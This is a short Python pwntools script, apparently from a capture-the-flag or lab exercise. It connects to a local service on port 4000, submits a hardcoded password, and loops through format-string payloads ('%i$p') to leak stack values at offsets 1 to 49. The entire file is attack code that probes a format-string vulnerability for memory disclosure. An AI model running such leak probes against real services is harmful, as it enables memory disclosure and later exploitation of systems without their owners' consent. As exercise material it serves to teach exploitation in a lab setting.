from pwn import *
context.log_level = 'error'
passwd = b"Alma_and_Pat"

for i in range(1, 50):
    p = remote('localhost', 4000)
    p.sendlineafter(b'>>> ', passwd)
    payload = f"%{i}$p".encode()
    p.sendlineafter(b'>>> ', payload)
    response = p.recvall(timeout=0.5).decode(errors='ignore')
    address = response.split("Hello ")[1].split(",")[0]
    print(f"Offset {i}: {address}")
    p.close()

